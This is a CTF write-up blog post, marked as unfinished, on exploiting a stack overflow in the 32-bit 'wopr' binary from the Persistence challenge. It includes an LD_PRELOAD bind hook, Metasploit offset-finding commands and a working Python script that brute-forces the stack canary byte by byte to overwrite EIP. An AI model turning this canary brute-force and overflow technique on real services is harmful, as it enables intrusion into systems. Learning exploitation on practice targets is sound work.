---
title: Bypassing Stack Canaries and Non Executable Stack on x86 Linux
date: 2024-05-27 21:13:06
categories: [EXPLOIT_DEV]
tags: [exploit_dev]     # TAG names should always be lowercase
---
*This post is a work in progress...*

For this blog post we will be exploiting a 32bit Linux binary called wopr, yup that's a wargames reference from a CTF Challenge called Persistence. 
![checksec](/assets/img/wopr/checksec-wopr.png)
First things first let's double check the binary protections, as you can see **checksec** has found that stack canaries and NX (Non Executable Stack) are both set.

![aslr](/assets/img/wopr/wopr-alsr.png)
As we are exploiting this directly from the CTF machine, I checked the ASLR status for the box with cat **/proc/sys/kernel/randomize_va_space** zero indicates it’s off, good news for us :)

Let's disassemble the application and take a peek, launch **gdb /usr/local/bin/wopr**. At the GDB prompt I set the disassembly flavour to Intel syntax as I find it easier to read, the command is **set disassembly-flavor intel**. I have then issued **disas main** to disassemble the main function, my reverse engineering skills are limited so I find the easiest way to get a very high level idea of how an application works is to look at the call instructions, we can see which functions are called and if necessary examine any interesting logic between the calls to c functions that commonly have memory corruption issues, I have removed everything but the calls from the output to make it clearer, by googling the get_reply function highlighted in red, we can determine that this is a custom function.
![disas main](/assets/img/wopr/disas_main_wopr.png)

Let’s take a look at get_reply as well using **disas get_reply**.
![disas_get_reply2.png](/assets/img/wopr/disas_get_reply2.png)

Looking at the disassembly of get_reply and using Microsoft’s security development life cycle article as a [reference](https://msdn.microsoft.com/en-us/library/bb288454.aspx) I noticed the call to memcpy which has been classified as a “banned memory copy function”, well this looks promising :)
![wopr-banned-func.png](/assets/img/wopr/wopr-banned-func.png)

So, we know where the issue should be, let’s take a quick look at the stack canary, after a bunch of research on the I found an article on [phrack](https://phrack.org/issues/67/13.html) to quote the paper “How do those canaries work? At the time of creating the stack frame, the so-called canary is added. This is a random number. When a hacker triggers a stack overflow bug, before overwriting the metadata stored on the stack he has to overwrite the canary. When the epilogue is called (which removes the stack frame) **the original canary value (stored in the TLS, referred by the gs segment selector on x86)** is compared to the value on the stack. If these values are different SSP (stack smashing protection) writes a message about the attack in the system logs and terminate the program“. This provided us with a clue if we encountered the “gs” register as to what was going on.

This can be seen in the disassembly below:
![disa-get_reply.png](/assets/img/wopr/disa-get_reply.png)

Obviously we want to take a look at the application using gdb in its running state while we send our payload but we can't attach directly to the running process as it's running as root. So we have two options one is to write some awful code to copy wopr via the ping command (yuck!) or the second easier technique is to debug it on the box. The problem is the port number wopr listens on is static, when we run it ourselves we get a bind error because the port number is in use already:
![wopr-already-in-use.png](/assets/img/wopr/wopr-already-in-use.png)

But as a super evil genius I won’t let that stops me. …Enter ld-preload, here's a quote from wikipedia “The dynamic linker can be influenced into modifying its behaviour during either  the program's execution or the program's linking. Examples of this can be seen in the runtime linker manual pages for various Unix-like systems. A typical modification of this behaviour is the use of the **LD_LIBRARY_PATH** and **LD_PRELOAD** environment variables. These variables adjust the runtime linking process by searching for shared libraries at alternate locations and by forcibly loading and linking libraries that would otherwise not be, respectively.” 4 What this means is we can replace a function at run time. After some searching I found a piece of code 5 that was replacing the bind src address but this wasn't quite what I needed, I needed to replace the bind port. 

I hacked away at the source code and eventually came up with bind.c – I've added some comments for your viewing pleasure:

```c++
#include <stdio.h> 
#include <dlfcn.h>
#include <arpa/inet.h>
#define LIBC_NAME "libc.so.6" 
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen) 
{ 
//for debugging so we know it's loaded ok 
printf("[+] Fixing port number\n"); 
int ret; 
void *libc; 
//loads a dynamic library – in this case libc 
libc = dlopen(LIBC_NAME, RTLD_LAZY); 
if (!libc) 
{ 
fprintf(stderr, "Unable to open libc!\n"); 
exit(-1); 
} 
//load the address of the original bind function
int (*bind_ptr)(int, void *, int); 
*(void **) (&bind_ptr) = dlsym(libc, "bind"); 
//create a copy of the original socksaddr_in, modify the bind port to 1337 
struct sockaddr_in myaddr_in; memcpy(&myaddr_in, addr, addrlen);
myaddr_in.sin_port = htons(1337);

//call the real bind function with our new structure – huzah! 
ret = (int)(*bind_ptr)(sockfd, (void *)&myaddr_in, sizeof(myaddr_in)); dlclose(libc); 
return ret; 
}
```

We compile this with: **gcc -fPIC -static -shared -o bind.so bind.c -lc –ldl**. Let’s break the command down, -fPIC sets the format as Position Independent Code, this makes our code suitable for inclusion in a library. We need a static object to load it into LD_PRELOAD so we use –static-shared, –lc statically links in libc and –ldl is for dynamic libraries
![lbdpreload-bind.png](/assets/img/wopr/lbdpreload-bind.png)

Let's set up LD_PRELOAD and give it a try:

![run-ldpreload.png](/assets/img/wopr/run-ldpreload.png)

If you're following along at home the LD_PRELOAD command is **export LD_PRELOAD=/tmp/exploit/bind.so**. Now we can debug this thing properly lets open another SSH session and see if we can overwrite EIP. We start by getting wopr's process id using **ps aux | grep wopr** – you can ignore the “defunct” processes these are processes that I have crashed and entered into a zombie state.
![wopr-zombie.png](/assets/img/wopr/wopr-zombie.png)

Let's take a quick look at what a stack canary is, it's basically a barrier put in place by an evil compiler called GCC, the simplified stack layout of a program using SSP which enforces the stack canary can be described by the diagram below:
![stack-canary-diagram.png](/assets/img/wopr/stack-canary-diagram.png)


Our payload will begin in the local variables section and overflow it’s way to EIP. In terms of the diagram, what we need to do is to sneak past the stack canary and EBP to get to the little hammer (EIP) to cause epic pwnage. 

How can we do this without being jumped on by a giant angry turtle I hear you say? Well what we do is a use a technique created by Ben Hawkes mentioned on [phrack 67](https://phrack.org/issues/67/13.html) his idea was to brute force the stack canary one byte at a time. How this works is: we send a string of A's, one A at a time until we trigger the stack smashing protection (SSP) which means the first byte of our canary was overwritten – this gives us the offset of the canary. Now we send our payload that looks like something like this:

```
[A*CANARY-OFFSET][CANARY BYTE 1 GUESS]
```
We send every possible combination 0x00 through to 0xff as our guess until we no longer receive the SSP error – this means we have determined the value of the first byte. We save this canary byte and move onto the next. i.e.  ```[A*CANARY-OFFSET][DISCOVERED CANARY BYTE][CANARY BYTE 2 GUESS]``` until we have discovered the whole canary. This reduces the possibilities from 255*255*255*255 (4228250625) combinations to 4*256 which is 1024. As you can see we drastically reduced the possibilities and amount of time it will take to perform this brute force.

You might ask yourself; doesn't the stack canary change every time we run the application? Yep it does but as wopr uses fork() when it receives a connection the stack canary is the same as the main process, from the man page “fork() creates a new process by duplicating the calling process. The new process, referred to as **the child, is an exact duplicate of the calling process**” therefore it is possible to brute force the canary until we have it.

One more thing we need is a way to detect if the canary value is incorrect, if we send a normal request:
![wopr-nc-1.png](/assets/img/wopr/wopr-nc-1.png)

If we send a long request of 1000 using the following commands **python -c 'print “A”*1000' > yhulothur and then nc 127.0.0.1 1337 < yhulothur** this will output 1000 A's to yhulothur and pipe it into wopr as input, we see that it no longer contains the “bye” section of the response:
![wopr-nc-2.png](/assets/img/wopr/wopr-nc-2.png)

Going back to the window that is running wopr, we can see that the request is triggering SSP and we are overwriting EIP with A's – we can use the presence of “bye” to determine if the canary is correct:
![wopr-eip.png](/assets/img/wopr/wopr-eip.png)

Before we get to writing a PoC to brute force the stack canaries, let's work out the offset of
EIP using msfpayload on our kali box using ***ruby /usr/share/metasploitframework/tools/pattern_create.rb 1000***
wopr-pattern1
![wopr-pattern1.png](/assets/img/wopr/wopr-pattern1.png)

If we go back to our ssh session on persistence and copy the output from msfpayload into a
file called find-eip and then pipe it to wopr using ***nc 127.0.0.1 1337 < find-eip***
![wopr-eip2.png](/assets/img/wopr/wopr-eip2.png)

We can see where the offset is on the SSP error:
![wopr-ssp.png](/assets/img/wopr/wopr-ssp.png)

Now we can enter this address into pattern_offset using ***ruby /usr/share/metasploitframework/tools/pattern_offset.rb 0x33624132***, we see that EIP's offset is 38.
![wopr-pattern-offset.png](/assets/img/wopr/wopr-pattern-offset.png)

Armed with this information we can write our code to brute force the canary. I present to
you get_canary.py

```python
#!/usr/bin/env python
import socket, time, sys

#declare globals
global target
global port
global eipoffset
global canarysize
canaryOffset = 0
canaryValue = ""

#this function sends a request to the wopr service (crudely) and receives the response
def sendRequest(target, port, payload):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
				s.connect((target, port))
				done = False
				while done == False:
					response=s.recv(1024)
					if ">" in response:
						s.send(payload)
						result = ""
						result =  s.recv(1024)
						result = result.strip() +  s.recv(1024)
						result = result.strip()
						return result
	except Exception, err:
				print Exception, err

#find canary offset by trying one A at a time until we hit the stack smash protection
def getCanaryOffset():
	for i in range(1,eipoffset):
			payload = "A"*i
			result = sendRequest(target,port,payload)
			if "bye" not in result:
				#we remove one from the result because the integer
				#is the first time hit the SSP
				offset=i-1 
				print "[+] Canary found at offset: " + str(offset)
				return offset
	
				
def bruteForceCanary(offset, length):
	canary = "" 
	#use the specified canary length  
	for byte in xrange(length):
		#try this many bytes for the canary
		#this code just generates the bytes 0-255 and converts them to characters
		for canary_byte in xrange(256):
			hex_byte = chr(canary_byte)
			#build up the payload using our predicted offset and brute force
			#the canary one byte at a time
			payload="A"*offset + canary + hex_byte
			result = sendRequest(target,port,payload)
			#if the canary byte was correct then "bye" is returned in the response
			if "bye" in result:
				canary += hex_byte
				break
	return canary


if len(sys.argv) < 4:
	print "[-] usage: python get_canary.py [ip] [port] [eip-offset] [canary-size]"
	exit(0)
else:
	target = sys.argv[1]
	port = int(sys.argv[2])
	eipoffset = int(sys.argv[3])
	canarysize = int(sys.argv[4])
	
	canaryOffset = getCanaryOffset()
	payload = bruteForceCanary(canaryOffset,canarysize)
	print "[+] Saving payload to payload.txt"
	fp = open("payload.txt", "w")
	fp.write("A"*canaryOffset + payload)
	fp.close()
```

If we give it a whirl we see the following:
![wopr-run-get_canary.png](/assets/img/wopr/wopr-run-get_canary.png)

We are writing 30 A's followed by the canary value to payload.txt so we can use it in our
testing:
![wopr-cat-payload.png](/assets/img/wopr/wopr-cat-payload.png)

Going back to our original concept that on the stack we have
```[Local Variables][Stack Canary][EBP][EIP]```
If we add BBBBCCCC to the end of payload.txt we should overwrite EBP with BBBB
(42424242) and EIP with CCCC (43434343) we can do this with the following command:
***echo -n $(cat payload.txt)BBBBCCCC > new-payload.txt***

It uses substitution to read payload.txt and echo (-n is for no new line characters) it out
along with BBBBCCCC back to payload.txt:
![wopr-cat-payload2.png](/assets/img/wopr/wopr-cat-payload2.png)

For the remainder of our debugging adventures we will use the following two commands:
```
set follow-fork-mode child
set detach-on-fork off
```

These commands help us debug the child processes that are spawned as this is where our
crash will occur, lets attach to the process as we did before and enter the commands we will
also enter c to allow the application to continue this is because when we attach a debugger
to an application it will put it into a paused state:
![wopr-follow2.png](/assets/img/wopr/wopr-follow2.png)

We now send our payload as before:
![wopr-new-payload2.png](/assets/img/wopr/wopr-new-payload2.png)

In the wopr window we see that there is no SSP error just a “got a connection message” –
the canary has been pwned.

